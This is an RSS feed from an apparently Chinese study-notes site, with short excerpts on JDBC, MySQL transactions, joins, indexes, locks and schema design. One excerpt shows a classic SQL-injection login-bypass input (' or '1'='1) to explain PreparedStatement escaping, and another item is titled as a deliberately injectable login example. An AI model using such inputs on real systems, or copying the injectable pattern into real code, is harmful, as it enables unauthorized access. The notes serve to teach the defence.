<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>知识Cool😊 on</title><link>https://ob.tianzhongs.ml/</link><description>Recent content in 知识Cool😊 on</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><atom:link href="https://ob.tianzhongs.ml/index.xml" rel="self" type="application/rss+xml"/><item><title/><link>https://ob.tianzhongs.ml/hello-world/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/hello-world/</guid><description/></item><item><title/><link>https://ob.tianzhongs.ml/%E5%8D%A0%E7%94%A8%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%8D%A0%E7%94%A8%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9/</guid><description/></item><item><title>0000_总结基本要点</title><link>https://ob.tianzhongs.ml/0000_%E6%80%BB%E7%BB%93%E5%9F%BA%E6%9C%AC%E8%A6%81%E7%82%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0000_%E6%80%BB%E7%BB%93%E5%9F%BA%E6%9C%AC%E8%A6%81%E7%82%B9/</guid><description>0000_总结基本要点 jdbc的作用，是啥 jdbc开发的步骤：导包jar， 开发6部分 为了避免sql注入，statement以及PreparedStatement使用的区别 使用资源绑定器，采用类反射机制等等，降低程序耦合度，可以通过配置文件来修改相应的设置等等 0007 通过资源绑定器获取属性文件 事物机制</description></item><item><title>00012_事务</title><link>https://ob.tianzhongs.ml/0012_%E4%BA%8B%E5%8A%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0012_%E4%BA%8B%E5%8A%A1/</guid><description>00012_事务 什么是事务？
一个事务是一个完整的业务逻辑单元，不可再分。 要想保证以上的两条DML语句同时成功或者同时失败，那么就需要使用数据库的“事务机制”。 和事务相关的语句只有：DML语句。（insert delete update）
为什么？因为它们这三个语句都是和数据库表当中的“数据”相关的。 事务的存在是为了保证数据的**完整性**，**安全性**。 [!faq]+ 事务的特性？ 事务包括四大特性：ACID A: 原子性：事务是最小的工作单元，不可再分。 C: 一致性：事务必须保证多条DML语句同时成功或者同时失败。 I：隔离性：事务A与事务B之间具有隔离。 D：持久性：持久性说的是最终数据必须持久化到硬盘文件中，事务才算成功的结束。</description></item><item><title>0001_JDBC基本概念</title><link>https://ob.tianzhongs.ml/0001_JDBC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0001_JDBC%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</guid><description>0001_JDBC基本概念 Java DataBase Connectivity（Java语言连接数据库）
JDBC的本质是什么？
JDBC是SUN公司制定的一套接口（interface）java.sql.\*; (这个软件包下有很多接口。) 面向接口编程可以降低程序耦合度，提高程序扩展力，多态机制就是典型的抽象编程。（Animal a=new CAt();） sun制定JDBC接口的原因：
每一个数据库的底层实现原理不一样，每一个产品有自己独特的实现原理，所以就需要数据库产品自己去写jdbc中接口的实现方式，供用户调用。</description></item><item><title>0001_概述</title><link>https://ob.tianzhongs.ml/0001_%E6%A6%82%E8%BF%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0001_%E6%A6%82%E8%BF%B0/</guid><description>0001_概述 概述 忘记root密码怎么解决？ 关闭正在运行的ySQL服务。 打开Dos窗口，转到nysql\bin目录。 输入mysqld-skip-grant-tables回车。&amp;ndash;skip-grant-tables的意思是启动ysQL服务的时候跳过权限表认证。 再开一个Dos窗口(因为刚才那个Dos窗口己经不能动了)，转到mysg1\bin目录。 输入mysg1回车，如果成功，将出现MySQL提示符
。 连接权限数据库：use mysq1;. 改密码：update user set password-=password(&amp;ldquo;123&amp;rdquo;)where user:=&amp;ldquo;root&amp;rdquo;;（别忘了最后加分号）。 刷新权限（必须步骤）：f1 ush privileges; 退出guit.</description></item><item><title>0002_JDBC开发基本使用</title><link>https://ob.tianzhongs.ml/0002_JDBC%E5%BC%80%E5%8F%91%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0002_JDBC%E5%BC%80%E5%8F%91%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</guid><description>0002_JDBC开发基本使用 开发前的准备 在对应的数据库官网下载jar包（这个jar中包括了的jdbc接口的具体实现方式） 如果是cmd窗口运行的话，就需要将其配置到 环境变量classpath中，一般需要设置两个东西，一个是.，表示当前路径，一个是jar包的具体位置，比如C:\Users\22305\Documents\MySql Connector Java 5.1.23\mysql-connector-java-5.1.23-bin.jar () 如果是idea的话，就需要导包，具体方法为两种 File&amp;ndash;&amp;gt;Project Structure&amp;mdash;Moudles&amp;ndash;&amp;gt;选择你对应的模块，然后在右侧的编辑窗口中点击+号，选择对应的jar包&amp;ndash;&amp;gt;导入之后，勾选上&amp;mdash;-&amp;gt;点击应用即可</description></item><item><title>0002_SQL语句的分类</title><link>https://ob.tianzhongs.ml/0002_SQL%E8%AF%AD%E5%8F%A5%E7%9A%84%E5%88%86%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0002_SQL%E8%AF%AD%E5%8F%A5%E7%9A%84%E5%88%86%E7%B1%BB/</guid><description>0002_SQL语句的分类 SQL语句的分类 DQL（数据查询语言）：查询语句，凡是selecti语句都是DQL. DML（数据操作语言)：insert delete update,对表当中的数据进行增删改。 DDL（数据定义语言）：create drop alter,对表结构的增删改。 TCL（事务控制语言）：commit提交事务，rollback回滚事务。 DCL（数据控制语言）：grant授权、revoke撤销权限等。</description></item><item><title>0003_JDBC开发6步</title><link>https://ob.tianzhongs.ml/0003_JDBC%E5%BC%80%E5%8F%916%E6%AD%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0003_JDBC%E5%BC%80%E5%8F%916%E6%AD%A5/</guid><description>0003_JDBC开发6步 注册驱动，两种方式 获取连接 建立SQL数据库操作对象 执行SQL语句 处理结果集 释放资源（java与数据库之间属于进程之间的通信）（一般在finally语句中，编辑的时候建议需要关闭的对象放在try外面设置为null，之后，释放资源代码写了之后再开始选择编辑）</description></item><item><title>0003_mysql基本命令使用</title><link>https://ob.tianzhongs.ml/0003_mysql%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0003_mysql%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</guid><description>0003_mysql基本命令使用 作用 命令 相关 登录mysql数据库管理系统 mysql -u root -p password 查看有哪些数据库 show databases; 创建数据库 bash create database 数据库名称; 选择要使用的数据库 use 数据库名称 查看当前数据库中的表 show tables; 初始化数据 source sql文件路径 初始化之后的三张表（sql类型的文件叫sql脚本） 删除数据库 drop database 数据库名称; 查看某个表结构 desc 表名; 查看某个数据表的所有记录 select * from 表名* 查看当前使用的数据库 select database(); 查看当前的mysql版本 select version(); 结束一条语句 \c 退出mysql exit quit \q 终止一条正在编写的语句 键入\c 查看其他库中的表 show tables from &amp;lt;database name&amp;gt;; 查看表的创建语句 show create table &amp;lt;table name&amp;gt;;</description></item><item><title>0004_Statement和PreparedStatement的区别</title><link>https://ob.tianzhongs.ml/0004_Statement%E5%92%8CPreparedStatement%E7%9A%84%E5%8C%BA%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0004_Statement%E5%92%8CPreparedStatement%E7%9A%84%E5%8C%BA%E5%88%AB/</guid><description>0004_Statement和PreparedStatement的区别 Statement存在SQL注入问题，而PreparedStatement解决了SQL注入问题 Statement存在安全编译时的类型检查问题，而PreparedStetement因为是采用setxxx的方式，可以在编译的时候做安全检查 Statement每次执行都需要编译一次，PreparedStatement编译一次，执行多次。 PreparedStatement因为是先发送给DBMS一个sql语句架子，DMBS进行了编译，然后再通过setxxx进行传值，最后再执行。以后每一次执行，PreparedStatement就不会再编译了，传值就可以直接传值执行，所以PreParedStatement执行效率更高。 综合：PreparedStatement使用较多
使用PreparedStatement之后传值，值中的特殊符号都会转义，所以避免了sql注入
1 com.mysql.jdbc.JDBC4PreparedStatement@5ce81285:select*fromt_userwhereloginName=&amp;#39;z&amp;#39;andloginPassword=&amp;#39;z\&amp;#39;or\&amp;#39;1\&amp;#39;=\&amp;#39;1&amp;#39; 什么时候采用Statement，需要用户注入sql语句的时候就需要用到，或者不包括安全问题的时候也可以用，参数不用单引号引起来的也需要用到</description></item><item><title>0004_查询语句相关</title><link>https://ob.tianzhongs.ml/0004_%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E7%9B%B8%E5%85%B3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0004_%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E7%9B%B8%E5%85%B3/</guid><description>0004_查询语句相关 like like：模糊查询，支持%和下划线匹配 % 代表多个任意字符（包括0个） _ 代表一个任意字符 like 后面的字符串必须放在单引号 &amp;rsquo;&amp;rsquo; 中 order by 升降序： order by asc表示升序，desc表示降序 多个排序条件，在多个条件中间逗号隔开即可 当有where时，必须放在where后面</description></item><item><title>0005_JDBC案例：给SQL数据库插入数据</title><link>https://ob.tianzhongs.ml/0005_JDBC%E6%A1%88%E4%BE%8B%E7%BB%99SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0005_JDBC%E6%A1%88%E4%BE%8B%E7%BB%99SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE/</guid><description>0005_JDBC案例：给SQL数据库插入数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 import java.</description></item><item><title>0005_连接</title><link>https://ob.tianzhongs.ml/0005_%E8%BF%9E%E6%8E%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0005_%E8%BF%9E%E6%8E%A5/</guid><description>0005_连接 根据连接方式来分类 内连接：inner join xxx on 条件 等值连接 非等值连接 自连接：通过自己来建立连接 外连接： left/right outer join xxx on 条件 ：主表的所有不满足条件的也会显示出来 左外连接（左连接） 示例 ： left outer join xxx on 条件 outer可以省略 右外连接（右连接） 示例 示例： 多张表连接查询 全连接（这个不讲，很少用！）</description></item><item><title>0006__嵌套子查询</title><link>https://ob.tianzhongs.ml/0006__%E5%B5%8C%E5%A5%97%E5%AD%90%E6%9F%A5%E8%AF%A2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0006__%E5%B5%8C%E5%A5%97%E5%AD%90%E6%9F%A5%E8%AF%A2/</guid><description>0006__嵌套子查询 嵌套子查询 where后面嵌套 from后面 select中使用子查询作为字段</description></item><item><title>0006_采用`Class.forName`方式注册驱动</title><link>https://ob.tianzhongs.ml/0006_%E9%87%87%E7%94%A8Class.forName%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%86%8C%E9%A9%B1%E5%8A%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0006_%E9%87%87%E7%94%A8Class.forName%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%86%8C%E9%A9%B1%E5%8A%A8/</guid><description>0006_采用Class.forName方式注册驱动 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import java.</description></item><item><title>0007_union</title><link>https://ob.tianzhongs.ml/0007_union/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0007_union/</guid><description>0007_union 合并集合（相加）</description></item><item><title>0007_通过资源绑定器获取属性文件</title><link>https://ob.tianzhongs.ml/0007_%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E7%BB%91%E5%AE%9A%E5%99%A8%E8%8E%B7%E5%8F%96%E5%B1%9E%E6%80%A7%E6%96%87%E4%BB%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0007_%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E7%BB%91%E5%AE%9A%E5%99%A8%E8%8E%B7%E5%8F%96%E5%B1%9E%E6%80%A7%E6%96%87%E4%BB%B6/</guid><description>0007_通过资源绑定器获取属性文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import java.</description></item><item><title>0008_limit</title><link>https://ob.tianzhongs.ml/0008_limit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0008_limit/</guid><description>0008_limit 是sql语句最后执行的一个环节 limit m,n 从第m个开始取，取n个记录 limit n 取n个记录</description></item><item><title>0008_完成第五步，处理结果集</title><link>https://ob.tianzhongs.ml/0008_%E5%AE%8C%E6%88%90%E7%AC%AC%E4%BA%94%E6%AD%A5%E5%A4%84%E7%90%86%E7%BB%93%E6%9E%9C%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0008_%E5%AE%8C%E6%88%90%E7%AC%AC%E4%BA%94%E6%AD%A5%E5%A4%84%E7%90%86%E7%BB%93%E6%9E%9C%E9%9B%86/</guid><description>0008_完成第五步，处理结果集 #书写注意点 在集合中的resultSet.getInt()等方法中的参数，select语句中有as的话，填写的是as之后的字段，而不是sql语句中的原有字段名称
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import java.</description></item><item><title>0009_DML（数据操作语言）</title><link>https://ob.tianzhongs.ml/0009_DML%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C%E8%AF%AD%E8%A8%80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0009_DML%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C%E8%AF%AD%E8%A8%80/</guid><description>0009_DML（数据操作语言） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 createtabletableName(columnNamedataType(length),……………….</description></item><item><title>0009_案例：连接数据库，验证用户登录(可被sql注入）</title><link>https://ob.tianzhongs.ml/0009_%E6%A1%88%E4%BE%8B%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%8F%AF%E8%A2%ABsql%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0009_%E6%A1%88%E4%BE%8B%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%8F%AF%E8%A2%ABsql%E6%B3%A8%E5%85%A5/</guid><description>0009_案例：连接数据库，验证用户登录(可被sql注入） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 import java.</description></item><item><title>001-部署Obsidian静态知识库网站</title><link>https://ob.tianzhongs.ml/%E9%83%A8%E7%BD%B2Obsidian%E9%9D%99%E6%80%81%E7%9F%A5%E8%AF%86%E5%BA%93%E7%BD%91%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E9%83%A8%E7%BD%B2Obsidian%E9%9D%99%E6%80%81%E7%9F%A5%E8%AF%86%E5%BA%93%E7%BD%91%E7%AB%99/</guid><description>部署 基本结构 1 2 3 4 5 6 7 8 9 graph BT zck(子模块_笔记仓库) fckhugo(父仓库hugo分支) fckmaster(父仓库master分支)--&amp;gt;wz(你vercel部署的网站) zck.-通过推送workflows+TOKEN推送到.-&amp;gt;fckhugo fckhugo.-通过转换为gitpage的workflows+TOKEN转换到 .-&amp;gt;fckmaster 仓库设置以及部署 父仓库（用于发布仓库：fork） fork我的的ObPublish仓库，然后使用git工具克隆clone到本地。</description></item><item><title>0010_约束(Constraint)</title><link>https://ob.tianzhongs.ml/0010_%E7%BA%A6%E6%9D%9FConstraint/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0010_%E7%BA%A6%E6%9D%9FConstraint/</guid><description>0010_约束(Constraint) 概述 什么是约束？常见的约束有哪些呢？ 在创建表的时候，可以给表的字段添加相应的约束， 添加约束的目的是为了保证表中数据的合法性、有效性、完整性。 常见的约束有哪些呢？ 非空约束(not null)：约束的字段不能为NULL 唯一约束(unique)：约束的字段不能重复 ** 但可以为NULL **。 主键约束(primary key)：约束的字段既不能为NULL，也不能重复（简称PK） 外键约束(foreign key)：&amp;hellip;（简称FK） 检查约束(check)：注意Oracle数据库有check约束，但是mysql没有，目前mysql不支持该约束。 实操例子 非空约束eg 建表 测试</description></item><item><title>0010_解决sql注入问题的PreparedStatement</title><link>https://ob.tianzhongs.ml/0010_%E8%A7%A3%E5%86%B3sql%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98%E7%9A%84PreparedStatement/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0010_%E8%A7%A3%E5%86%B3sql%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98%E7%9A%84PreparedStatement/</guid><description>0010_解决sql注入问题的PreparedStatement 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 import java.</description></item><item><title>0011_事务机制</title><link>https://ob.tianzhongs.ml/0011_%E4%BA%8B%E5%8A%A1%E6%9C%BA%E5%88%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0011_%E4%BA%8B%E5%8A%A1%E6%9C%BA%E5%88%B6/</guid><description>0011_事务机制 事务机制的作用 JDBC中默认事务机制是：执行一条，提交一条。 但是在实际应用开发中，有时候需要多条DML语句共同联合完成或者失败来决定是否提交到数据库，所以就需要事物机制。 比如：转账，需要两个语句中的转出和转入都要成功，或者总共的钱就会有缺失或者多余
关闭事物提交：获取连接的对象.setAutoCommit(true); 进行提交：xx.commit(); 回滚：xx.rollback();一般写在异常中，用于DML语句中出现了异常就回滚事务
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import jdbc.</description></item><item><title>0011_存储引擎</title><link>https://ob.tianzhongs.ml/0011_%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0011_%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/</guid><description>0011_存储引擎 完整的建表语句
1 2 3 CREATETABLE`t_x`(`id`int(11)DEFAULTNULL)ENGINE=InnoDBDEFAULTCHARSET=utf8; mysql默认使用的存储引擎是InnoDB方式。 默认采用的字符集是UTF8
什么是存储引擎呢？
存储引擎这个名字只有在mysql中存在。（Oracle中有对应的机制，但是不叫做存储引擎。Oracle中没有特殊的名字，就是“表的存储方式”） mysql支持很多存储引擎，每一个存储引擎都对应了一种不同的存储方式。 每一个存储引擎都有自己的优缺点，需要在合适的时机选择合适的存储引擎。 查看当前mysql支持的存储引擎？ show engines \G</description></item><item><title>0012_JBMC封装类</title><link>https://ob.tianzhongs.ml/0012_JBMC%E5%B0%81%E8%A3%85%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0012_JBMC%E5%B0%81%E8%A3%85%E7%B1%BB/</guid><description>0012_JBMC封装类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package jdbc; import java.</description></item><item><title>0013_MySQL数据库相关的基本使用</title><link>https://ob.tianzhongs.ml/0013_MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0013_MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</guid><description>0013_MySQL数据库相关的基本使用 准备MySQL 安装MySQL，老是出现安不上的问题，nt软件，重新多安几次
Navicat的基本使用 没啥说的
设计数据库表 下载PowerDesigner工具 打开之后，选择create model&amp;ndash;&amp;gt;model types&amp;ndash;&amp;gt;physical data model 在下面的DBMS中选择mysql的对应版本，比如mysql5.0 ，点击ok 设计表 保存sql脚本,你可以将保存的sql脚本继续进行优化修改 cmd登录mysql后，可以采用source xxx.</description></item><item><title>0013_索引</title><link>https://ob.tianzhongs.ml/0013_%E7%B4%A2%E5%BC%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0013_%E7%B4%A2%E5%BC%95/</guid><description>0013_索引 什么是索引？有什么用？ 索引就相当于一本书的目录，通过目录可以快速的找到对应的资源。 在数据库方面，查询一张表的时候有两种检索方式：
第一种方式：全表扫描 第二种方式：根据索引检索（效率很高） 索引为什么可以提高检索效率呢？ 其实最根本的原理是缩小了扫描的范围。 索引虽然可以提高检索效率，但是不能随意的添加索引，因为索引也是数据库当中 的对象，也需要数据库不断的维护。是有维护成本的。比如，表中的数据经常被修改 这样就不适合添加索引，因为数据一旦修改，索引需要重新排序，进行维护。
添加索引是给某一个字段，或者说某些字段添加索引。
举例 select ename,sal from emp where ename = 'SMITH'; 当ename字段上没有添加索引的时候，以上sql语句会进行全表扫描，扫描ename字段中所有的值。 当ename字段上添加索引的时候，以上sql语句会根据索引扫描，快速定位。 怎么创建索引对象？怎么删除索引对象？ 创建索引对象：</description></item><item><title>0014_悲观锁（行级锁）以及乐观锁基本认识</title><link>https://ob.tianzhongs.ml/0014_%E6%82%B2%E8%A7%82%E9%94%81%E8%A1%8C%E7%BA%A7%E9%94%81%E4%BB%A5%E5%8F%8A%E4%B9%90%E8%A7%82%E9%94%81%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0014_%E6%82%B2%E8%A7%82%E9%94%81%E8%A1%8C%E7%BA%A7%E9%94%81%E4%BB%A5%E5%8F%8A%E4%B9%90%E8%A7%82%E9%94%81%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86/</guid><description>0014_悲观锁（行级锁）以及乐观锁基本认识 悲观锁： select语句后面加上for update 比如
1 2 3 selectcnamefromdeptwhereno=12forupdate`那么查询出来的数据，就会被加锁，直到释放之前，都不能都被别的线程使用修改简单的理解就是：线程同步锁，嘎嘎好理解 查询出出来的语句会被锁上，别的线程无法修改其中的数据 事务需要排队执行，类似于同步线程，要修改的数据需要事务一个一个的排队
乐观锁 支持并发，需要修改的数据，每次读取都有一个版本号 事务不需要排队，每次读取都有一个版本号（比如1.1），提交的时候核对版本号是否和读取的一样（1.1） 一样就提交，并修改成新的版本号（1.2） 不一样就回滚，不提交，重新读取</description></item><item><title>0014视图(view)</title><link>https://ob.tianzhongs.ml/0014%E8%A7%86%E5%9B%BEview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0014%E8%A7%86%E5%9B%BEview/</guid><description>0014视图(view) 什么是视图？ 站在不同的角度去看到数据。（同一张表的数据，通过不同的角度去看待）。
怎么创建视图？怎么删除视图？ create view myview as select empno,ename from emp; drop view myview;
注意：只有DQL语句才能以视图对象的方式创建出来。
对视图进行增删改查，会影响到原表数据。（通过视图影响原表数据的，不是直接操作的原表） 可以对视图进行CRUD操作。</description></item><item><title>0015_DBA命令</title><link>https://ob.tianzhongs.ml/0015_DBA%E5%91%BD%E4%BB%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0015_DBA%E5%91%BD%E4%BB%A4/</guid><description>0015_DBA命令 将数据库当中的数据导出 在windows的dos命令窗口中执行：（导出整个库） mysqldump bjpowernode&amp;gt;D:\bjpowernode.sql -uroot -p333
在windows的dos命令窗口中执行：（导出指定数据库当中的指定表） mysqldump bjpowernode emp&amp;gt;D:\bjpowernode.sql -uroot –p123
导入数据 create database bjpowernode; use bjpowernode; source D:\bjpowernode.</description></item><item><title>0016_数据库设计三范式</title><link>https://ob.tianzhongs.ml/0016_%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E4%B8%89%E8%8C%83%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0016_%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E4%B8%89%E8%8C%83%E5%BC%8F/</guid><description>0016_数据库设计三范式 什么是设计范式？
设计表的依据。按照这个三范式设计的表不会出现数据冗余。
三范式都是哪些？ 第一范式：任何一张表都应该有主键，并且每一个字段原子性不可再分。 第二范式：建立在第一范式的基础之上，所有非主键字段完全依赖主键，不能产生部分依赖。 第三范式：建立在第二范式的基础之上，所有非主键字段直接依赖主键，不能产生传递依赖。
两张表，多的表加外键</description></item><item><title>0017_一对一怎么设计？</title><link>https://ob.tianzhongs.ml/0017_%E4%B8%80%E5%AF%B9%E4%B8%80%E6%80%8E%E4%B9%88%E8%AE%BE%E8%AE%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0017_%E4%B8%80%E5%AF%B9%E4%B8%80%E6%80%8E%E4%B9%88%E8%AE%BE%E8%AE%A1/</guid><description>0017_一对一怎么设计？ 一对一设计有两种方案：主键共享 1 2 3 4 5 6 7 8 9 10 11 &amp;gt;t_user_login 用户登录表 &amp;gt;id(pk) username password &amp;gt;-------------------------------------- &amp;gt;1 zs 123 &amp;gt;2 ls 456 &amp;gt; &amp;gt;t_user_detail 用户详细信息表 &amp;gt;id(pk+fk) realname tel .</description></item><item><title>001_JDK、JRE、JVM的关系</title><link>https://ob.tianzhongs.ml/001_JDKJREJVM%E7%9A%84%E5%85%B3%E7%B3%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/001_JDKJREJVM%E7%9A%84%E5%85%B3%E7%B3%BB/</guid><description>001_JDK、JRE、JVM的关系 JDK：java开发工具包 JRE：java运行环境 JVM：java虚拟机 软件需要JRE才能跑起来 jDK包括jRE，JVM JRE包括JVM JDK以及JRE不能跨平台，不同平台需要安装不同平台的对应包 Java程序最终运行在JVM上 java体系技术的分类
